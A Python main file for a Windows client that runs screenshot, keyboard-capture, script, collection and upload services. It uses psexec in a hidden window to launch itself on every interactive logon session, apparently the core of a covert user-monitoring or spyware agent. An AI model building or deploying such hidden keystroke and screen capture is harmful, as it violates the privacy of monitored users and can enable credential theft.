# -*- coding: utf-8 -*-
# from __future__ import unicode_literals

import os
import sys
import signal
from services.screenshoter import Screenshoter
from services.scripter import Scripter
from services.uploader import Uploader
from services.kbdsvc import Kbdsvc
from services.collector import Collector
import logger
from config import config
import utils
from utils import fmt


log = logger.getLogger(config['NAME'], config['LOGLEVEL'])


def is_already_running(name):
    """
    Check if process "name" is already running on current loggon session
    :name: process name
    """
    import psutil
    try:
        pids = [proc.pid for proc in psutil.process_iter() if proc.name() == name and proc.pid != os.getpid()]
        curr_sess = utils._get_session_of_pid2(os.getpid())
        for pid in pids:
            try:
                if utils._get_session_of_pid2(pid) == curr_sess:
                    return True
            except Exception as e:
                log.debug(e)
    except Exception as e:
        log.error(e)


def fork_on_session(sess):
    """
    Fork self process on session "sess" via psexec
    :sess: logon session
    """
    import subprocess
    si = subprocess.STARTUPINFO()
    si.dwFlags = subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE
    subprocess.Popen([utils.fs_enc(os.path.join(config["SELF_DIR"], "psexec.exe")), "-accepteula", "-d", "-i", str(sess),
                      utils.fs_enc(sys.executable)],
                     shell=False, startupinfo=si)


class SPclient():

    def __init__(self):
        self.datadir = os.path.join(config['HOME_DIR'], config['NAME'], utils.get_user_name())
        self.daemons = []
        signal.signal(signal.SIGTERM, self.signal_term)

        self.daemons.append(Collector())
        self.daemons.append(Screenshoter())
        self.daemons.append(Scripter())
        self.daemons.append(Uploader())
        self.daemons.append(Kbdsvc())

        utils.makedirs(self.datadir)

    def signal_term(self, signum, frame):
        log.debug(fmt('Get Signal: {0}', signum))
        self.stop()

    def start(self):
        for d in self.daemons:
            d.start()
        self.wait_termination()

    def stop(self):
        for d in self.daemons:
            d.stop()

    def wait_termination(self):
        for d in self.daemons:
            try:
                d.join()
            except Exception:
                pass


if __name__ == '__main__':
    log.debug(fmt("PID={0}", os.getpid()))
    try:
        if hasattr(sys, 'frozen'):
            curr_sess = utils._get_session_of_pid2(os.getpid())
            self_terminate = False

            if is_already_running(os.path.basename(sys.executable)):
                sys.exit()
            # fork only on interactive sessions (LogonType == 2)
            for sessdata in utils._enumerate_logonsessions():
                if sessdata.get('Session') == curr_sess and sessdata.get('LogonType') != 2:
                    self_terminate = True
                if sessdata.get('LogonType') == 2:
                    fork_on_session(sessdata.get('Session'))
            # If self process was running on non interactive session, then exit
            if self_terminate:
                sys.exit()

        SPclient().start()
    finally:
        log.debug('Exit')
